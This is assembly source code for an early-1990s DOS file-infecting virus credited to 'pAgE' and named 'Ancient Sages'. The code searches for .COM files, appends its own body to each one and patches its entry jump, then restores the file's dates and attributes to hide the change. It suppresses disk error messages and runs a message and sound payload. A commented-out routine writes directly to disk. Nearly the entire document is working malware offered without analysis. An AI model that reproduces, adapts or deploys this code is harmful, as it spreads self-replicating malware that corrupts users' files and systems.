;
;        ÖÄÄ¿ ÖÄÄ¿ ÖÄÄ¿ ÄÒÄ ÒÄÄ¿ ÖÄÄ¿ ÖÄÒÄ¿
;        ÇÄÄ´ º  ³ º     º  ÇÄ   º  ³   º
;        Ð  Á Ð  Á ÓÄÄÙ ÄÐÄ ÐÄÄÙ Ð  Á   Ð
;                ÖÄ¿ ÖÄÄ¿ ÖÄÄ¿ ÒÄÄ¿
;                ÓÄ¿ ÇÄÄ´ º Ä¿ ÇÄ
;               ÓÄÄÙ Ð  Á ÓÄÄÙ ÐÄÄÙ
;
;          ...from the books of pAgE
;


        .model tiny
        .code

        org  100h

depth_of_well           equ    longer_than-my_dick

my_dick:
                        call yump_up_and_go

yump_up_and_go:         pop     bp
                        sub     bp,offset yump_up_and_go
                        jmp     hop_over_da_shit

and_over_it_again:      mov     ax,3524h
                        int     21h
                        mov     word ptr [bp+stash_box],bx
                        mov     word ptr [bp+stash_box+2],es
                        mov     ah,25h
                        lea     dx,[bp+offset int24]
                        int     21h
                        push    cs
                        pop     es
                        jmp     gordon_effect

hop_over_da_shit:       lea     si,[bp+stash_3]
                        mov     di,100h
                        push    di
                        movsw
                        movsb

                        mov     byte ptr [bp+how_many],4
stupid_shit_trns:       mov     ah,1Ah
                        lea     dx,[bp+new_chunk]
                        int     21h

                        mov     ah,47h
                        mov     dl,0
                        lea     si,[bp+where_we_is]
                        int     21h
                        mov     byte ptr [bp+eyelash],'\'

                        jmp     and_over_it_again
                        jmp     bang_bang
put_fletch_on_it        proc    far

yeeha_go:               mov     ah,0h
                        mov     al,12h
                        int     10h

                        jmp     yo_homey_1
stupid_shit_1           db      4
stupid_shit_2           dw      0
                        db      62h, 79h
copyright               db      '-->>pAgE<<--'
                        db      '(C)1992 TuRN-THE-pAgE       '
stupid_shit_5           db      'Ancient  Sages'
                        db      '     '
                        db      '   Is one of pAgEs'
                        db      '            '
                        db      '$'
yo_homey_1:
                        push    si
                        push    di
                        mov     si,80h
                        cld
                        call    mo_stupid_shit_1
                        cmp     byte ptr [si],0Dh
                        je      yo_homey_4
                        mov     cx,28h
                        lea     di,stupid_shit_5
yo_homeyloop_2:
                        lodsb
                        cmp     al,0Dh
                        je      yo_homey_3
                        stosb
                        loop    yo_homeyloop_2
yo_homey_3:
                        inc     cx
                        mov     al,2Eh
                        rep     stosb
yo_homey_4:
                        pop     di
                        pop     si

                        mov     dx,si
                        mov     cx,di
                        mov     stupid_shit_2,cx
yo_homey_5:
                        mov     stupid_shit_1,0FFh
yo_homey_6:
                        add     stupid_shit_1,1
                        mov     bl,stupid_shit_1
                        mov     cx,40
                        call    mo_stupid_shit_2

yo_homeyloop_7:
                        mov     al,byte ptr copyright+20h[bx]
                        mov     ah,0eh
                        int     10h

                        inc     bx
                        call    mo_stupid_shit_3
                        mov     dl,0FFh
                        mov     ah,6
                        int     21h

                        jnz     yo_homey_10
                        loop    yo_homeyloop_7

                        cmp     byte ptr copyright+20h[bx],24h
                        je      yo_homey_5
                        jmp     short yo_homey_6

put_fletch_on_it        endp

mo_stupid_shit_1        proc    near

yo_homey_8:
                        inc     si
                        cmp     byte ptr [si],20h
                        je      yo_homey_8
                        retn
mo_stupid_shit_1        endp

mo_stupid_shit_2        proc    near

                        push    ax
                        push    bx
                        push    cx
                        push    dx
                        mov     dx,si
                        mov     cx,di
                        mov     ah,0Fh
                        int     010h
                        mov     ax,1210h
                        mov     bx,55h
                        int     10h
                        pop     dx
                        pop     cx
                        pop     bx
                        pop     ax

                        retn
mo_stupid_shit_2        endp

mo_stupid_shit_3        proc    near
                        push    cx
                        mov     cx,258h
yo_homeyloop_9:
                        loop    yo_homeyloop_9
                        pop     cx
                        retn
mo_stupid_shit_3        endp

yo_homey_10:
                        call    mo_stupid_shit_2
                        mov     cx,4Fh
yo_homeyloop_11:
                        mov     al,20h
                        mov     ah,0Eh
                        int     10h

                        loop    yo_homeyloop_11

                        mov     ah,1
                        mov     cx,stupid_shit_2
                        int     10h

                        jmp     bang_bang
                        call    fuck_da_monkey

gordon_effect:          lea     dx,[bp+what_we_wants]
                        mov     ah,4eh
                        mov     cx,7h
findfirstyump_up_and_go:        nop
                        int     21h

                        mov     al,0h
                        call    tear_it_open

                        xchg    ax,bx

                        mov     ah,3fh
                        lea     dx,[bp+muffler]
                        mov     cx,1ah
                        int     21h

                        mov     ah,3eh
                        int     21h
check_it_out:

                        mov     ax,word ptr [bp+new_chunk+1Ah]
                        cmp     ax,(longer_than-my_dick)
                        jb      find_next

                        cmp     ax,65535-(longer_than-my_dick)
                        ja      find_next

                        mov     bx,word ptr [bp+muffler+1]
                        add     bx,longer_than-my_dick+3
                        cmp     ax,bx
                        je      find_next
                        jmp     yo_over_here
find_next:
                        mov     ah,4fh
                        jmp     short findfirstyump_up_and_go
                        mov     ah,3bh
                        lea     dx,[bp+dot_dot]
                        int     21h
                        jnc     gordon_effect

                        mov     bx,word ptr [bp+muffler+1]
                        add     bx,longer_than-my_dick+3
yo_over_here:           mov     cx,3
                        sub     ax,cx
                        lea     si,[bp+offset muffler]
                        lea     di,[bp+offset stash_3]
                        movsw
                        movsb
                        mov     byte ptr [si-3],0e9h
                        mov     word ptr [si-2],ax
finishgordon_effection:
                        push    cx
                        xor     cx,cx
                        call    attributes


                        mov     al,2
                        call    tear_it_open

                        mov     ah,40h
                        lea     dx,[bp+muffler]
                        pop     cx
                        int     21h

                        mov     ax,4202h
                        xor     cx,cx
                        cwd
                        int     21h

                        mov     ah,40h
                        lea     dx,[bp+my_dick]
                        mov     cx,longer_than-my_dick
                        int     21h

                        mov     ax,5701h
                        mov     cx,word ptr [bp+new_chunk+16h]
                        mov     dx,word ptr [bp+new_chunk+18h]
                        int     21h

                        mov     ah,3eh
                        int     21h

                        mov     ch,0
                        mov     cl,byte ptr [bp+new_chunk+15h]
                        call    attributes

leave_heeruh_virus:
                        mov     ax,2524h
                        lds     dx,[bp+offset stash_box]
                        int     21h
                        push    cs
                        pop     ds

olley:                  call    put_fletch_on_it

tear_it_open            proc    near
                        mov     ah,3dh
                        lea     dx,[bp+new_chunk+30]
                        int     21h
                        xchg    ax,bx
                        ret
endp                    tear_it_open

attributes              proc    near
                        mov     ax,4301h
                        lea     dx,[bp+new_chunk+30]
                        int     21h
                        ret
endp                    attributes
int24:
                        mov     al,3
                        iret
yumpem_keep             dd      ?
how_many                db      ?
davey_jones             dd      ?
yumpem_keep2            db      ?
stash_3                 db      0cdh,20h,0
davey_jones2            dd      ?
what_we_wants           db      "*.COM",0
muffler                 db      1ah dup (?)
stash_box               dd      ?
eyelash                 db      ?
where_we_is             db      64 dup (?)
new_chunk               db      43 dup (?)
dot_dot                 db      '..',0

;<><><><><><><><><><><><><><><><><><><><><><><><><><>
;       Borrowed this segment from the VCL
;<><><><><><><><><><><><><><><><><><><><><><><><><><>

bang_bang               proc    near
                        mov     cx,0025h
new_shot:               push    cx
                        mov     dx,0140h
                        mov     bx,0100h
                        in      al,061h
                        and     al,11111100b
fire_shot:              xor     al,2
                        out     061h,al
                        add     dx,09248h
                        mov     cl,3
                        ror     dx,cl
                        mov     cx,dx
                        and     cx,01FFh
                        or      cx,10
shoot_pause:            loop    shoot_pause
                        dec     bx
                        jnz     fire_shot
                        and     al,11111100b
                        out     061h,al
                        mov     bx,0002h
                        xor     ah,ah
                        int     1Ah
                        add     bx,dx
shoot_delay:            int     1Ah
                        cmp     dx,bx
                        jne     shoot_delay
                        pop     cx
                        loop    new_shot
endp                    bang_bang

fuck_da_monkey          proc    near
                        ;xor     ah,ah
                        ;int     1Ah
                        ;xchg    dx,ax
                        ;mov     dx,0FFh
out_loop:               ;out     dx,al
                        ;dec     dx
                        ;jne     out_loop

                        ;mov     al,0002h
                        ;mov     cx,3
                        ;lea     dx,stupid_shit1_file
                        ;int     26h

                        ;cli
                        ;hlt
                        ;jmp     short $
endp                    fuck_da_monkey
                        int     20h
longer_than:
                        end       my_dick
